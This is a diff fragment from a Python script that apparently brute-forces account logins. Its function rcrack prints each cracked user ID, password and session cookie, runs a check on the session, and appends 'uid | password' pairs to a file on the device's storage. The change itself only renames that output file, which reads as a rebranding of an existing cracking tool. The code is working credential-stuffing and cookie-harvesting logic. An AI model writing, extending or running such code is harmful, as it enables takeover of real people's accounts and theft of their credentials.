@@ -229,7 +229,7 @@ def rcrack(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\r\033[1;32m[S4JIB-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Tutul-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/S4JIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
